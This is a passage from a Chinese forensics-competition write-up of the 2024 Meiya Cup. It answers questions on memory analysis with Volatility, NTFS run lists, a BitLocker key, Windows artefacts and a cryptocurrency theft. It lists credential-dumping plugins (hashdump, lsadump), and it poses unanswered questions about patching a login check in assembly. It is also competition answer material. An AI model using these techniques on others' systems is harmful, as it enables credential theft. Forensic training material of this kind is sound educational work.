列出内核中的回调函数</span><br><span class="line">    windows.cmdline.CmdLine</span><br><span class="line">                        显示进程的命令行参数</span><br><span class="line">    windows.crashinfo.Crashinfo</span><br><span class="line">    转储崩溃转储信息</span><br><span class="line">    windows.devicetree.DeviceTree</span><br><span class="line">                        主要是列出一些和驱动程序，附加设备有关的信息</span><br><span class="line">    windows.dlllist.DllList</span><br><span class="line">                        列出每个进程加载的dll</span><br><span class="line">    windows.driverirp.DriverIrp</span><br><span class="line">                        List IRPs for drivers in a particular windows memory image.</span><br><span class="line">    windows.drivermodule.DriverModule</span><br><span class="line">                        Determines if any loaded drivers were hidden by a rootkit</span><br><span class="line">    windows.driverscan.DriverScan</span><br><span class="line">                        Scans for drivers present in a particular windows memory image.</span><br><span class="line">    windows.filescan.FileScan</span><br><span class="line">                        扫描内存镜像中存在的文件</span><br><span class="line">    windows.dumpfiles.DumpFiles</span><br><span class="line">                        根据上一条命令给出的物理地址以--phyaddr参数导出文件</span><br><span class="line">    windows.envars.Envars</span><br><span class="line">                        展示环境变量</span><br><span class="line">    windows.getservicesids.GetServiceSIDs</span><br><span class="line">                        Lists process token sids.</span><br><span class="line">    windows.getsids.GetSIDs</span><br><span class="line">                        获取并显示所有进程的sid，以及对应的用户名</span><br><span class="line">    windows.handles.Handles</span><br><span class="line">                        Lists process open handles.</span><br><span class="line">    windows.hashdump.Hashdump</span><br><span class="line">                        dump出用户的nthash和lmhash</span><br><span class="line">    windows.info.Info   展示操作系统和内核的详细信息</span><br><span class="line">    windows.joblinks.JobLinks</span><br><span class="line">                        Print process job link information</span><br><span class="line">    windows.ldrmodules.LdrModules</span><br><span class="line">    windows.lsadump.Lsadump</span><br><span class="line">                       dump出储存再在HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets这个注册表路径之下的 Lsa secrets.</span><br><span class="line">    windows.malfind.Malfind</span><br><span class="line">                       列出可能存在注入代码进程及其内存范围</span><br><span class="line">    windows.mbrscan.MBRScan</span><br><span class="line">                        扫描并解析可能存在的主引导记录</span><br><span class="line">    windows.memmap.Memmap</span><br><span class="line">                        查看分页的虚拟地址到物理地址的内存映射</span><br><span class="line">    windows.mftscan.MFTScan</span><br><span class="line">                        Scans for MFT FILE objects present in a particular windows memory image.</span><br><span class="line">    windows.modscan.ModScan</span><br><span class="line">                        Scans for modules present in a particular windows memory image.</span><br><span class="line">    windows.modules.Modules</span><br><span class="line">                        Lists the loaded kernel modules.</span><br><span class="line">    windows.mutantscan.MutantScan</span><br><span class="line">                        Scans for mutexes present in a particular windows memory image.</span><br><span class="line">    windows.netscan.NetScan</span><br><span class="line">                        Scans for network objects present in a particular windows memory image.</span><br><span class="line">    windows.netstat.NetStat</span><br><span class="line">                        Traverses network tracking structures present in a particular windows memory image.</span><br><span class="line">    windows.poolscanner.PoolScanner</span><br><span class="line">                        A generic pool scanner plugin.</span><br><span class="line">    windows.privileges.Privs</span><br><span class="line">                        Lists process token privileges</span><br><span class="line">    windows.pslist.PsList</span><br><span class="line">                        Lists the processes present in a particular windows memory image.</span><br><span class="line">    windows.psscan.PsScan</span><br><span class="line">                        Scans for processes present in a particular windows memory image.</span><br><span class="line">    windows.pstree.PsTree</span><br><span class="line">                        Plugin for listing processes in a tree based on their parent process ID.</span><br><span class="line">    windows.registry.certificates.Certificates</span><br><span class="line">                        Lists the certificates in the registry&#x27;s Certificate Store.</span><br><span class="line">    windows.registry.hivelist.HiveList</span><br><span class="line">                        输出注册表文件的虚拟地址及其在磁盘上的路径</span><br><span class="line">    windows.registry.hivescan.HiveScan</span><br><span class="line">                        输出注册表文件的物理地址</span><br><span class="line">    windows.registry.printkey.PrintKey</span><br><span class="line">                        指定注册表的键或者地址，可以返回对应的值，指定注册表的键用--key选项，指定地址用--offset选项；</span><br><span class="line">    windows.registry.userassist.UserAssist</span><br><span class="line">                        显示注册表userassist键的值，这个主要反应用户的活动痕迹，其中包含用户经常执行的程序的记录。文件名、上次执行时间和执行次数</span><br><span class="line">                        （补充一下，如果不是内存取证，可以在 </span><br><span class="line">                        \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&#123;CEBFF5CD-ACE2-4F4F-</span><br><span class="line">                        9178-9926F41749EA&#125;\Count这个键下看到exe的运行记录，但是都是rot13编码过的，另一个以值F4E57C4B开头的子键则储存了lnk的</span><br><span class="line">                        运行记录）</span><br><span class="line">    windows.sessions.Sessions</span><br><span class="line">                        lists Processes with Session information extracted from Environmental Variables</span><br><span class="line">    windows.skeleton_key_check.Skeleton_Key_Check</span><br><span class="line">                        Looks for signs of Skeleton Key malware</span><br><span class="line">    windows.ssdt.SSDT   Lists the system call table.</span><br><span class="line">    windows.statistics.Statistics</span><br><span class="line">    windows.strings.Strings</span><br><span class="line">                        Reads output from the strings command and indicates which process(es) each string belongs to.</span><br><span class="line">    windows.svcscan.SvcScan</span><br><span class="line">                        Scans for windows services.</span><br><span class="line">    windows.symlinkscan.SymlinkScan</span><br><span class="line">                        Scans for links present in a particular windows memory image.</span><br><span class="line">    windows.vadinfo.VadInfo</span><br><span class="line">                        Lists process memory ranges.</span><br><span class="line">    windows.vadwalk.VadWalk</span><br><span class="line">                        Walk the VAD tree.</span><br><span class="line">    windows.vadyarascan.VadYaraScan</span><br><span class="line">                        Scans all the Virtual Address Descriptor memory maps using yara.</span><br><span class="line">    windows.verinfo.VerInfo</span><br><span class="line">                        Lists version information from PE files.</span><br><span class="line">    windows.virtmap.VirtMap</span><br><span class="line">                        Lists virtual mapped sections.</span><br></pre></td></tr></table></figure><p><strong>60. [填空题] 参考RAM_Capture_David_Laptop.RAW，汇出PID：724的程序，其哈希值(SHA-256)是？(2分)</strong></p><p>这里用MemProcFS挂载内存镜像为文件系统，在pid\724\modules之下找到了lsass.exe,计算得sha256是ffef2a93eb08b26f22ba30994591be11c90a7bc68cd756edd7f9f671e065a52f，貌似不同师傅做出来的有点不一样</p><p><strong>61. [单选题] 参考RAM_Capture_David_Laptop.RAW，哪一个是执行PID：724程序的SID？(1分)</strong><br>A. S-1-1-0<br>B. S-1-2-0<br>C. S-1-5-21-1103701427-1706751984-2965915307-1001<br>D. S-1-5-21-1103701427-1706751984-2965915307-513</p><p>这个用volatility3可以做；</p><p>我发现了一个比较不错的办法，对于这种的大的内存，可以采用共享文件夹的办法，这样不会增加虚拟机得负担，又能在虚拟机上直接访问内存，然后把volaitility也复制到共享文件里，就可以跑了,显然选A；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vol.py -f [memory_name.raw] windows.getsids.GetSIDs|grep lsass</span><br></pre></td></tr></table></figure><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/Mandeleyev_Blog\source_posts\2024“美亚杯”第十届中国电子数据取证大赛个人赛WP\61.png" alt="61"></p><p>——————————————————————————————————————————————————————————————————————</p><p><strong>62. [填空题] 参考RAM_Capture_David_Laptop.RAW，账户David Tenth的NT LAN Manager的哈希值(NTLM Hash)？(答案格式:只需使用全部小写及阿拉伯数字回答) (1分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/62.png" alt="62"></p><p><strong>63. [单选题] 在取证中，你发现D盘被BitLocker加密。U盘上可能有一些线索，你对U盘进行了取证。参考David_USB_8GB.e01，David 的U盘文件系统的格式？(2分)</strong><br>A. NTFS<br>B. FAT32<br>C. exFAT<br>D. ReFS<br>xways一转成磁盘就有（不过参考小谢取证<a href="https://mp.weixin.qq.com/s/oaQI66HogOqY_tLEfloRDQ%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%8E%B0%E5%9C%A8%E6%9F%A5%E7%9C%8B%E9%82%A3%E9%87%8C%E7%82%B9%E5%87%BB%E6%A1%88%E4%BB%B6%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%88%9B%E5%BB%BA%E6%96%B0%E6%A1%88%E4%BB%B6%EF%BC%8C%E6%B7%BB%E5%8A%A0%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%99%E6%A0%B7%E4%B8%8B%E4%B8%80%E9%A2%98%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E7%9C%8B">https://mp.weixin.qq.com/s/oaQI66HogOqY_tLEfloRDQ，建议现在查看那里点击案件数据，创建新案件，添加镜像文件，然后这样下一题可以直接看</a>)</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/63.png" alt="63"></p><p><strong>64. [单选题] 参考David_USB_8GB.e01，David的U盘文件系统中，每簇(Cluster)定义了多少字节(Byte)？(2分)</strong><br>A. 128<br>B. 256<br>C. 512<br>D. 1024<br>C</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/64.png" alt="image-20241231204154576"></p><p><strong>65. [单选题] 参考David_USB_8GB.e01，David的U盘中有多少个已删除的文件？(2分)</strong><br>A. 1<br>B. 2<br>C. 3<br>D. 4<br>被删除的直接看这个“描述”就可以，如果是“曾经存在，内容可能改变”这样的，说明已经是删除的了</p><p>这里只有一个文件描述是这样的，所以只有一个删除的</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/65.png" alt="65"></p><p><strong>66.[单选题] 承上题,参考David_USB_8GB.e01,已删除的文件的运行列表(Run List)的运行偏移量(Run Offset)数量是多少? (2分)</strong><br>A. 16<br>B. 32<br>C. 64<br>D. 128</p><p>这里总一下和NTFS文件系统和MFT的知识，参考自公众号“小谢取证”，文章链接在前面已经给出:</p><p>1.NTFS文件系统的结构</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/NTFS-1.png" alt="NTFS-1"></p><p>2查看文件对应的MFT记录：</p><p>右键文件，导航→转至文件记录</p><p>MFT簇的结构：</p><p>MFT文件记录头+属性列表</p><p>MFT文件记录头：</p><p>签名:46 49 4C 45  对应FILE标识</p><p>第21<del>22字节，对应第一个属性偏移<br>第23</del>24字节，flags</p><p>属性列表：</p><p>每个属性由属性头和属性体构成，属性头的第一个字节表明属性类型。</p><p>可以用xways的模板管理器选择NTFS显示MFT结构</p><p>常见的属性类型有0x10,0x30和0x80以及0xB0，分别是标准属性，文件名属性，数据属性，位图属性；</p><p>常驻属性和非常驻属性：一般而言，文件的属性值小于1KB时，其贮存在MFT之内，这称之为常驻属性，如果属性值大于1KB则贮存在MFT之外，用一个指针指向MFT文件记录之外的一个外部簇，形成B+树结构，不贮存在MFT的属性叫做非常驻属性。常驻属性和非常驻属性的判断方法看属性的第九个直接00表示常驻属性，01表示非常驻属性；</p><p>RunList：用于描述文件或数据属性在磁盘上的存储位置和大小。具体来说，Run List记录了一个或多个数据流的起始簇号（Starting Cluster Number，SCN）和每个数据流的长度（即占用的簇数），这些信息对于定位和访问文件或数据属性的实际存储位置至关重要。</p><p> RunListOffset：指示了RunList的在属性之内的相对于属性记录第一个字节的偏移位置。在第0x21-0x22，常用的值为0x40</p><p>根据问题，找到非常驻属性的第32个字节，值为40，所以转十进制是64</p><p><strong>67.[单选题] 承上题,参考David_USB_8GB.e01,已删除文件的第一个运行的十六进制值(低端字节序 Little-Endian)是多少? (3分)</strong><br>A. 0x4C3F0DB522<br>B. 0x4C3F0D22B5<br>C. 0x224C3F0DB5<br>D. 0x3F4C0DB522</p><p>RunList解析：RunList记录了多个数据流的大小和起始簇号：</p><p>规则如下：数据流记录（运行）&#x3D;1Byte（高位表示起始簇号长度，低位表示簇大小的长度）+簇大小+起始簇号，注意都是后两者都是小段字节序；</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/67.png" alt="67"></p><p>对于这个，其簇号长度2，簇大小长度2，所以簇大小为DB5&#x3D;3509，起始簇号为4C3F&#x3D;19519,第一个运行总体的小端字节序是4C3F0DB522，选A</p><p><strong>68.[填空题] 承上题,参考David_USB_8GB.e01,已删除的文件的实际大小(单位:字节 Byte)是多少? 答案格式:只需使用阿拉伯数字回答 (2分)</strong></p><p>看文件的详细信息</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/68.png" alt="68"></p><p><strong>69.[填空题] 承上题,参考David_USB_8GB.e01,已删除文件的第一个运行偏移量(Run Offset)是多少? (答案格式:只需使用阿拉伯数字回答) (2分)</strong></p><p><strong>70[单选题] 承上题,参考David_USB_8GB.e01,已删除的文件的第一个运行的簇运行长度(Run Length)是多少? (2分)</strong><br>A. 2408<br>B. 3509<br>C. 3128<br>D. 4021</p><p>这两题上面都说过了，19519和3509</p><p><strong>71.[单选题] 承上题,参考David_USB_8GB.e01,已删除文件的图像文件像素值(Pixel)是多少? (2分)</strong><br>A. 1000 x 2000<br>B. 2000 x 3000<br>C. 3000 x 4000<br>D. 4000 x 5000</p><p>同68，详细信息</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/71.png" alt="70"></p><p><strong>72.[单选题] 承上题,参考David_USB_8GB.e01,已删除图像文件是用哪个品牌和型号的手机拍摄? (2分)</strong><br>A. SAMSUNG SM-A425<br>B. SAMSUNG SM-A4580<br>C. SAMSUNG SM-A4260<br>D. SAMSUNG SM-A5G</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/72.png" alt="72"></p><p>下面73~79恶意程序部分没时间，因为本来不是很会，等有时间了再细细的复现</p><p><strong>73.在U盘中,你还发现了一个exe文件,但它被锁定,可能需要进行反编译以便进一步检查。参考David_USB_8GB.e01,使用x64dbg的字符串搜索(String Search)功能,在Bitlocker.exe中查找哪个字符串最有可能与显示的登录状态有关? (1分)</strong></p><p><strong>74.承上題,当找到控制登录成功的逻辑代码时,如何修改汇编代码(Assembly Code)来绕过检查,达到任意输入，都成功登录的效果? (2分)</strong></p><p><strong>75.参考David_USB_8GB.e01,Bitlocker.exe的正确用户登录名称是? (1分)</strong></p><p><strong>76.参考David_USB_8GB.e01,Bitlocker.exe的正确登录密码是? (2分)</strong></p><p><strong>77.参考David_USB_8GB.e01,当Bitlocker.exe程序尝试显示登录结果（成功或失败）时,使用了哪一种途径来决定显示的消息? (2分)</strong></p><p><strong>78.参考David_USB_8GB.e01,决定能否解密Bitlocker Key 的字节的内存偏移量(Memory Offset)（相对于基址”bitlocker.exe”）是什么? (3分)</strong></p><p><strong>79.参考David_USB_8GB.e01,决定能否解密Bitlocker Key 的内存偏移量(Memory Offset)后,应该如何利用它来进行解密? (2分)</strong><br>A. 将该偏移量处的值改为 1 (true),以启用解密过程<br>B. 将该偏移量处的值改为 0 (false),以重新初始化加密过程<br>C. 将该偏移量的内容保存到档中以作解密过程中的key<br>D. 清空该偏移量的内存并强制退出程序</p><p><strong>80. [单选题] 参考David_USB_8GB.e01，解密后的Bitlocker Key是？(3分)</strong><br>A. 299255-418649-198198-616891-099682-482306-642609-483527<br>B. 745823-918273-564738-290183-475920-182736-594827-162839<br>C. 539823-847291-094857-194756-382910-472918-482937-120984<br>D. 829384-192837-475910-298374-019283-847362-564738-293847<br><strong>A</strong></p><p>65题就有bitlocker密钥的图片，打开是A</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/80.png" alt="image-20241231204856968"></p><p><strong>81. [单选题] 到目前为止,你已经获得了BitLocker密钥以解密D盤，通过对David笔记本电脑D盤的分析，并发现了一些重要信息。你现在将继续调查未加密的C盤｡ 参考David_Laptop_64GB.e01，分区格式(Partition)是？(2分)</strong><br>A. MBR<br>B. GPT<br>C. RAW<br>用diskpart.exe的list disk可以看到就是GPT</p><p><strong>82. [单选题] 参考David_Laptop_64GB.e01,該e01 成功提取的日期和时间是? (2分)</strong></p><p>A. 2024-09-05 15:55:28<br>B. 2024-09-02 11:52:31<br>C. 2024-09-03 14:37:28<br>D. 2024-09-03 12:16:49<br><strong>83. [填空题] 参考David_Laptop_64GB.e01，最后登录的用户是谁？(答案格式:大写英文字母,小写英文字母和空格混合组成,例如:Tom Hanks) (2分)</strong></p><p>David Tenth</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/83.png" alt="83"></p><p><strong>84. [单选题] 参考David_Laptop_64GB.e01，用户配置的时区是？(2分)</strong><br>A. Australian Central Time<br>B. China Standard Time<br>C. New Zealand Standard Time<br>D. Nepal Time</p><p><strong>B</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/84.png" alt="84"><br><strong>85. [单选题] 参考David_Laptop_64GB.e01，David的笔记本电脑曾經连接了多少个设备？(2分)</strong><br>A. 1<br>B. 2<br>C. 3<br>D. 4<br>usb连接有三个</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/85.png" alt="85"></p><p><strong>86. [填空题] 参考David_Laptop_64GB.e01，David的笔记本电脑上的Firefox浏览器安装了哪些扩展工具？(答案格式:请以大寫英文字母作答，无须留空白位) (2分)</strong></p><p>METAMASK</p><p>直接仿真后打开firefox看</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/86.png" alt="86"></p><p><strong>87. [单选题] 参考David_Laptop_64GB.e01，根据用户配置文件中的.lnk文件，最后访问的文件名称是？(2分)</strong><br>A. 下載<br>B. export-token<br>C. RAM_Capture_DaviD<br>D. 本機磁碟(E) (2)</p><p><strong>B</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/87.png" alt="87"></p><p><strong>88. [单选题] 参考David_Laptop_64GB.e01,David的笔记本电脑曾經连接了多少个不同的Wi-Fi? (2分)</strong><br>A. 1<br>B. 2<br>C. 3<br>D. 4<br><strong>A</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/88.png" alt="88"><br><strong>89. [填空题] 承上题,参考David_Laptop_64GB.e01，该Wi-Fi网络的名称(SSID)是？(答案格式:大写英文字母和小写英文字母混合组成) (2分)</strong></p><p>ErrorError5G，ssid&#x3D;&#x3D;wifi名称</p><p><strong>90. [单选题] 参考David_Laptop_64GB.e0，该电脑的Windows操作系统的安装日期是什么？(2分)</strong><br>A. 2024-07-31 09:55:37 UTC+8<br>B. 2024-08-01 13:10:15 UTC+8<br>C. 2024-07-31 10:18:26 UTC+8<br>D. 2024-08-01 14:43:55 UTC+8<br>C. 2024-07-31 10:18:26 UTC+8</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/90.png" alt="90"><strong>91. [单选题] 通过对David 笔记本电脑的电子数据取证和痕迹分析，你了解到David是一名cryptocurrency专家。(假設虚拟貨幣International Digital Forensics Coin (IDFC)面值是每1個IDFC等如1-HKD IDFC Token Address: 0x56E7A6dd8aA1c78ba77944C94c43054978E89b7b 區塊鏈: Binance Smart Chain) 下列那个网站能够找到区块链:Binance Smart Chain的交易记录？(1分)</strong><br>A. binance.com<br>B. bscscan.com<br>C. etherscan.io<br>D. blockchain.com</p><p>前面有提到firefox装了metamask所以直接看firefox浏览器记录发现有B</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/91.png" alt="91"></p><p><strong>92. [单选题] 参考Emma_Mobile.zip中的微信聊天记录分析，Emma用什么方法盜取David的IDFC？(1分)</strong><br>A. Emma经Clara盗取了David虚拟货币钱包的私匙(Private Key)<br>B. Emma经Clara盗取了David虚拟货币钱包的公匙(Public Key)<br>C. Emma经Clara盗取了David虚拟货币钱包的回复匙(Recovery seed)<br>D. Emma盗取了David电话<br><strong>C</strong><br><strong>93. [单选题] 根据David,Emma及Clara的微信对话，David在什么日期时间发现IDFC被盗？(1分)</strong><br>A. 2024-8-22 18:06<br>B. 2024-8-28 09:14<br>C. 2024-8-28 09:57<br>D. 2024-8-29 15:52<br><strong>B</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/93.png" alt="93"></p><p><strong>94. [单选题] 参考Emma_Mobile.zip中的微信对话分析，Emma为什么盜取David的IDFC？(1分)</strong><br>A. Emma为了买名贵手表<br>B. Emma为了赌钱<br>C. Emma为了炒卖虚拟货币<br>D. Emma为了还财务公司的欠债<br><strong>D</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/94.png" alt="94"><strong>95. [单选题] 参考David_Laptop_64GB.e01及David，Emma及Clara的微信对话，分析IDFC的交易记录，Emma盜取了David虚拟货币钱包内哪个地址的IDFC? (2分)</strong><br>A. 0x10a4f01b80203591ccee76081a4489ae1cd1281c<br>B. 0x152c90200be61a540875f2a752c328bd19dbfb87<br>C. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220<br>D. 0x70544880875fe907cee383873ca58da23378caa5</p><p>交易纪录是在D盘export-token的csv</p><p>首先分析聊天记录发现recover seed被emma知道是08-26中午14时左右，发现钱包被偷是在08-28早上9时一刻左右；</p><p>在csv里面筛选，注意csv时UTC时间，要+8h</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/95-1.png" alt="95-1"></p><p>有三条，但是根据被偷之前David的余额，排除中间；</p><p>17开头的地址在表中出现过不止一次，排除；</p><p>答案为第三条，<strong>A</strong></p><p><strong>96. [单选题] 根据David，Emma及Clara的微信对话及IDFC的交易记录作分析，Emma总共盗取了David多少IDFC？(2分)</strong><br>A. 90,000 IDFC<br>B. 170,000 IDFC<br>C. 9,300,000 IDFC<br>D. 9,390,000 IDFC<br><strong>A</strong><br><strong>97. [多选题] 根据Emma及Clara的微信对话，下列哪些地址是由相同的恢复短语(Recovery Seed)所生成？(3分)</strong><br>A. 0x10a4f01b80203591ccee76081a4489ae1cd1281c<br>B. 0x152c90200be61a540875f2a752c328bd19dbfb87<br>C. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220<br>D. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042</p><p>BIP-39:BIP-39（Bitcoin Improvement Proposal 39）是一个针对加密货币钱包的标准，定义了如何使用一组助记词（也叫助记词种子）来生成一个可以恢复的私钥。这个标准规定了如何从助记词生成一个加密钱包的私钥，并且支持基于这些私钥衍生出钱包中的多个地址。</p><p>在我们知道recover seed的情况下可以从recover seed→私钥→地址，用这个网站：<a href="https://iancoleman.io/bip39/">BIP39 - Mnemonic Code</a></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/97.png" alt="97"></p><p><strong>ABC</strong></p><p><strong>98. [单选题] 